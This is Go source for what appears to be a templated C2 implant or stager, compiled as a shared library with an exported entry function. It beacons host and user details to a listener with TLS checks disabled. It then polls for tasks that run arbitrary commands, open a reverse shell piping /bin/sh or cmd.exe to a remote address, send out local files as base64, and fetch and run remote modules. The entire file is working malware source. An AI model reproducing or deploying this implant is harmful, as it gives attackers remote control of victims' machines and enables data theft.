package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"
	"C"
)

// constants defined by the stager
const (
	STAGER        string = "{{stager.id}}"
	LISTENER_IP   string = "{{stager.listener.address}}"
	LISTENER_PORT string = "{{stager.listener.port}}"
	SSL           string = "{{stager.listener.ssl | lower}}"
	UID		      string = "{{identifier.uid}}"
)

var (
	URL        string = LISTENER_IP + ":" + LISTENER_PORT // URL of the listener
	name       string = ""                                // name of the device assigned by the server
	output     string = ""                                // output of the action
	success    bool   = false                             // success of the action
	sleep_time int                                        // sleep time between retries
	retries    int                                        // number of retries
	delay      int                                        // delay before connecting to the listener
)

type Task struct {
	ID      int                    `json:"id"`
	Name    string                 `json:"name"`
	Action  string                 `json:"action"`
	Args    map[string]interface{} `json:"args"`
	Output  interface{}            `json:"output"`
	Success bool                   `json:"success"`
}

type Module struct {
	Name              string   `json:"name"`
	Admin             bool     `json:"admin"`
	Language          string   `json:"language"`
	Code_type         string   `json:"code_type"`
	Execution_methods []string `json:"execution_methods"`
}

func init_stager() http.Client {
	// Set up the protocol for the listener
	if SSL == "true" {
		URL = "https://" + URL
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	} else {
		URL = "http://" + URL
	}

	// string so it doesn't error when developing
	delay, _ := strconv.Atoi("{{stager.delay}}")
	sleep_time, _ = strconv.Atoi("{{stager.options['sleep-time']}}")
	retries, _ = strconv.Atoi("{{stager.retries}}")

	// Set up the HTTP client
	client := &http.Client{}

	time.Sleep(time.Duration(delay) * time.Second)

	data := system_info()

	fmt.Println("Connecting to the L15t3n€r...")

	// check if we can connect to the listener so it doesn't stop the stager
	_, err := client.Get(URL)

	if err != nil {
		fmt.Println("C0nn3ct10n f41l3d.")
		for i := 0; i < retries; i++ {
			fmt.Printf("R3trying (%d/%d)...\n", i+1, retries)
			time.Sleep(time.Duration(sleep_time) * time.Second)
			_, err := client.Get(URL)
			if err == nil {
				break
			}
		}
	}

	if err != nil {
		fmt.Println("C0nn3ct10n f41l3d.")
		os.Exit(1)
	}

	res, err := client.Post(URL+"/connect", "application/json", bytes.NewBuffer(data))

	if err != nil {
		fmt.Println("C0nn3ct10n f41l3d.")
		os.Exit(1)
	} else {
		fmt.Println("C0nn3ct3d.")
	}

	var result map[string]interface{}
	json.NewDecoder(res.Body).Decode(&result)
	name = result["name"].(string)
	return *client
}

func system_info() []byte {
	// get system info
	hostname, err := os.Hostname()

	if err != nil {
		hostname = "unknown"
	}

	user, err := user.Current()
	var username string
	if err != nil {
		username = "unknown"
	} else {
		username = user.Username
	}

	data, err := json.Marshal(map[string]interface{}{

		"hostname":     hostname,
		"os":           runtime.GOOS,
		"architecture": runtime.GOARCH,
		"user":         username,
		"admin":        false,
		"stager":       STAGER,
		"uid":          UID,
	})

	return data

}

// Run a command and return the output and success
func run_command(command string) (output string, success bool) {
	parts := strings.Fields(command)
	executable := parts[0]
	args := parts[1:]
	cmd := exec.Command(executable, args...)
	stdout, err := cmd.Output()
	output, success = string(stdout), err == nil
	// has to return the output and success because its called by modules too
	return
}

// Execute a module using a task
func execute_module(
	task Task,
) (output string, success bool) {

	// Get the module
	resp, err := http.Get(URL + "/module/" + task.Name)

	if err != nil || resp.StatusCode != http.StatusOK {
		output, success = "Could not download module.", false
		return
	}

	defer resp.Body.Close()

	// Read the module
	module_body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		output, success = "Could not read module.", false
		return
	}

	// Unmarshal the module
	var module Module
	err = json.Unmarshal(module_body, &module)

	if err != nil {
		output, success = "Could not parse module.", false
		return
	}

	// Get the module code
	resp, err = http.Get(URL + "/module/download/" + task.Name)

	if err != nil || resp.StatusCode != http.StatusOK {
		output, success = "Could not download module code.", false
		return
	}

	defer resp.Body.Close()

	// Read the module code
	module_code, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		output, success = "Could not read module code.", false
		return
	}
	// Execute the module

	if task.Args["execution_method"] == "command" {
		output, success = run_command(string(module_code))
	} else {
		output, success = "Unsupported execution method.", false
	}
	return
}

func reverse_shell(address string, port float64) {
	// convert the port to an string
	converted_port := strconv.Itoa(int(port))
	conn, err := net.Dial("tcp", address+":"+converted_port)

	if err != nil {
		return
	}

	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func download_file(task_name string, path string) {
	// Get the file from the server
	resp, err := http.Get(URL + "/download/" + task_name)

	if err != nil || resp.StatusCode != http.StatusOK {
		output, success = "Could not download file.", false
		return
	}

	defer resp.Body.Close()

	// Create the file locally
	file, err := os.Create(path)

	defer file.Close()

	if err != nil {
		output, success = "Could not create file.", false
		return
	}

	// Write the file
	_, err = io.Copy(file, resp.Body)

	if err != nil {
		output, success = "Could not write to file.", false
		return
	}

	output, success = "File downloaded successfully.", true

}

func upload_file(file_name string) {
	// open the file and encode it to base64
	file, err := os.Open(file_name)

	if err != nil {
		output, success = "Could not open file.", false
		return
	}

	defer file.Close()

	fileInfo, _ := file.Stat()
	var size int64 = fileInfo.Size()
	bytes := make([]byte, size)

	buffer := bufio.NewReader(file)
	_, err = buffer.Read(bytes)

	if err != nil {
		output, success = "Could not read file.", false
		return
	}

	output, success = base64.StdEncoding.EncodeToString(bytes), true
}

//export {{stager.options["exported_function"]}}
func {{stager.options["exported_function"]}}() {
	client := init_stager()

	for {
		time.Sleep(time.Duration(sleep_time) * time.Second)

		// Get the tasks
		resp, err := client.Get(URL + "/tasks/" + name)

		if err != nil {
			fmt.Println("Could not fetch tasks.")
			continue
		}

		defer resp.Body.Close()
		respBytes, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			fmt.Println("Could not read response body.")
			continue
		}

		var tasks []Task
		err = json.Unmarshal(respBytes, &tasks)

		if err != nil {
			fmt.Println("Could not unmarshal response body.")
			continue
		}

		for _, task := range tasks {
			switch task.Action {
			case "rce":
				output, success = run_command(task.Args["cmd"].(string))
			case "dir":
				run_command("ls " + task.Args["dir"].(string))
			case "reverse-shell":
				go reverse_shell(task.Args["address"].(string), task.Args["port"].(float64))
				output, success = "Opened reverse shell.", true
			case "download":
				upload_file(task.Args["target_path"].(string))
			case "upload":
				download_file(task.Name, task.Args["target_path"].(string))
			case "module":
				output, success = execute_module(task)
			default:
				output, success = "Task not supported.", false
			}
			fmt.Println("Task: ", task.ID, "Output: ", output, "Success: ", success)

			data, err := json.Marshal(map[string]interface{}{
				"task":    task.ID,
				"output":  output,
				"success": success,
			})

			if err != nil {
				continue
			}

			client.Post(URL+"/finish/"+name, "application/json", bytes.NewBuffer(data))
		}
	}
}

func main() {

}
